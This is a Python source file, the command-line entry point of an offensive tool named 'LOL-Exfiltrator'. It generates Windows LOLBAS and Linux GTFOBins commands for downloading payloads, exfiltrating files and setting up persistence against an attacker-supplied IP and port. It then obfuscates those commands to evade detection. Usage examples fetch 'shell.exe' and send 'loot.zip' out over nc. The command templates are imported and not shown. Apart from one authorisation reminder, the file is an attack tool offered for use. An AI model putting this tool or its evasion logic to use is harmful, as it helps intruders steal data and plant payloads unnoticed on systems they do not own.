#!/usr/bin/env python3
"""LOL-Exfiltrator — Main CLI entry point."""

import argparse
import sys

from commands.windows_lolbas  import WINDOWS_COMMANDS
from commands.linux_gtfobins  import LINUX_COMMANDS
from core.obfuscator          import obfuscate
from core.display             import (
    print_banner, print_section, print_result_header,
    print_clear_command, print_obfuscated_command,
    print_technique, print_stealth_note, print_obf_explanation,
    print_requires, print_divider, print_info, print_warning,
    print_error, print_success, prompt, prompt_choice,
)




SUPPORTED_OS      = ['windows', 'linux']
SUPPORTED_ACTIONS = ['download', 'upload', 'persistence']




def get_commands(os_type: str, action: str) -> list:
    """Return the command list for the given OS and action."""
    db = WINDOWS_COMMANDS if os_type == 'windows' else LINUX_COMMANDS
    return db.get(action, [])


def build_command(template: str, ip: str, port: str, filename: str) -> str:
    """Substitute placeholders in a command template."""
    return (
        template
        .replace('{ip}', ip)
        .replace('{port}', port)
        .replace('{filename}', filename)
    )


def run_interactive(args: argparse.Namespace) -> None:
    """
    Interactive wizard mode — walk the user through OS, action,
    IP/port/filename, then display results.
    """
    print_banner()



    if args.os:
        os_type = args.os.lower()
        if os_type not in SUPPORTED_OS:
            print_error(f"Unsupported OS '{args.os}'. Choose: {', '.join(SUPPORTED_OS)}")
            sys.exit(1)
        print_info(f"Target OS : {os_type.capitalize()}")
    else:
        print_section("Step 1 › Select Target OS")
        os_type = prompt_choice("Target OS", [o.capitalize() for o in SUPPORTED_OS]).lower()

    if args.action:
        action = args.action.lower()
        if action not in SUPPORTED_ACTIONS:
            print_error(f"Unsupported action '{args.action}'. Choose: {', '.join(SUPPORTED_ACTIONS)}")
            sys.exit(1)
        print_info(f"Action    : {action.capitalize()}")
    else:
        print_section("Step 2 › Select Action")
        action = prompt_choice("Desired Action", [a.capitalize() for a in SUPPORTED_ACTIONS]).lower()

    if action in ('download', 'upload'):

        attacker_ip   = args.ip   or prompt("Attacker IP", "192.168.1.100")
        attacker_port = args.port or prompt("Attacker Port", "8080")
        filename      = args.filename or prompt("Remote Filename", "payload.exe")
    else:

        attacker_ip   = args.ip   or prompt("Callback IP (for payload URL)", "192.168.1.100")
        attacker_port = args.port or prompt("Callback Port", "8080")
        filename      = args.filename or prompt("Payload Filename (served over HTTP)", "shell.ps1")


    commands = get_commands(os_type, action)
    if not commands:
        print_error(f"No commands found for OS='{os_type}' action='{action}'.")
        sys.exit(1)


    if args.binary:
        commands = [c for c in commands if args.binary.lower() in c['binary'].lower()]
        if not commands:
            print_warning(f"No commands match binary filter '{args.binary}'. Showing all.")
            commands = get_commands(os_type, action)


    print_section(
        f"Results  ›  OS: {os_type.capitalize()}  |  Action: {action.capitalize()}  "
        f"|  Target: {attacker_ip}:{attacker_port}/{filename}"
    )
    print_info(f"Found {len(commands)} technique(s). Generating clear + obfuscated commands…\n")

    for idx, cmd_entry in enumerate(commands, start=1):
        clear_cmd = build_command(
            cmd_entry['template'],
            attacker_ip, attacker_port, filename
        )

        obf_result = obfuscate(
            command  = clear_cmd,
            os_type  = os_type,
            binary   = cmd_entry['binary'],
            ip       = attacker_ip,
            technique= args.obf_technique or 'auto',
        )

        print_result_header(idx, cmd_entry['name'])
        print_divider()

        print_clear_command(clear_cmd)
        print_stealth_note(cmd_entry['stealth_note'])
        print()

        print_obfuscated_command(obf_result['obfuscated_command'])
        print_technique(obf_result['technique_used'])
        print_obf_explanation(obf_result['explanation'])

        if cmd_entry.get('requires'):
            print()
            print_requires(cmd_entry['requires'])

        print()

    print_success("Done. Copy the obfuscated command that best fits your scenario.")
    print_warning("Reminder: Use only on systems you are authorised to test.")




def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog        = 'lol-exfiltrator',
        description = (
            'LOL-Exfiltrator — LOLBAS (Windows) '
            'and GTFOBins (Linux) Download / Exfil / Persistence techniques '
            'with built-in command obfuscation.'
        ),
        epilog = (
            'Examples:\n'
            '  python lol_exfiltrator.py\n'
            '  python lol_exfiltrator.py --os windows --action download '
            '--ip 10.10.10.10 --port 8080 --filename shell.exe\n'
            '  python lol_exfiltrator.py --os linux --action upload '
            '--ip 10.0.0.1 --port 4444 --filename loot.zip --binary nc\n'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target = parser.add_argument_group('Target')
    target.add_argument(
        '--os', '-O',
        choices=['windows', 'linux', 'Windows', 'Linux'],
        metavar='OS',
        help='Target operating system: windows | linux',
    )
    target.add_argument(
        '--action', '-a',
        choices=['download', 'upload', 'persistence',
                 'Download', 'Upload', 'Persistence'],
        metavar='ACTION',
        help='Technique category: download | upload | persistence',
    )
    target.add_argument(
        '--ip', '-i',
        metavar='ATTACKER_IP',
        help='Attacker IP address (callback / file-server address)',
    )
    target.add_argument(
        '--port', '-p',
        metavar='PORT',
        default='',
        help='Attacker listening port',
    )
    target.add_argument(
        '--filename', '-f',
        metavar='FILENAME',
        help='Remote filename to download / upload / execute',
    )

    filt = parser.add_argument_group('Filtering')
    filt.add_argument(
        '--binary', '-b',
        metavar='BINARY',
        help='Filter results to a specific LOLBin / GTFOBin (e.g. certutil, nc)',
    )

    obf = parser.add_argument_group('Obfuscation')
    obf.add_argument(
        '--obf-technique', '-t',
        dest    = 'obf_technique',
        metavar = 'TECHNIQUE',
        default = 'auto',
        choices = ['auto', 'env_var', 'ps_iex', 'env_concat', 'hex_ip', 'unicode'],
        help    = (
            'Obfuscation strategy to apply (default: auto).\n'
            '  auto       – chosen automatically per OS/binary\n'
            '  env_var    – %%SystemRoot%% env-var expansion (Windows)\n'
            '  ps_iex     – PowerShell IEX string-concat (Windows)\n'
            '  env_concat – shell variable name splitting (Linux)\n'
            '  hex_ip     – IP address to hex form (both)\n'
            '  unicode    – URL percent-encoding (Linux)\n'
        ),
    )

    misc = parser.add_argument_group('Misc')
    misc.add_argument(
        '--list', '-l',
        action  = 'store_true',
        help    = 'List all available techniques for the specified OS (no command generation)',
    )
    misc.add_argument(
        '--version', '-v',
        action  = 'version',
        version = '%(prog)s 1.0.0',
    )

    return parser




def run_list_mode(args: argparse.Namespace) -> None:
    """Print a catalogue of available techniques without generating commands."""
    print_banner()

    os_types = [args.os.lower()] if args.os else SUPPORTED_OS
    actions  = [args.action.lower()] if args.action else SUPPORTED_ACTIONS

    for os_type in os_types:
        db = WINDOWS_COMMANDS if os_type == 'windows' else LINUX_COMMANDS
        os_label = "Windows (LOLBAS)" if os_type == 'windows' else "Linux (GTFOBins)"

        for action in actions:
            entries = db.get(action, [])
            if not entries:
                continue
            print_section(f"{os_label}  ›  {action.capitalize()}")
            for i, entry in enumerate(entries, 1):
                print_info(f"{i:2}.  {entry['name']}  ({entry['binary']})")
    print()




def main() -> None:
    parser = build_parser()
    args   = parser.parse_args()

    if args.list:
        run_list_mode(args)
    else:
        run_interactive(args)


if __name__ == '__main__':
    main()
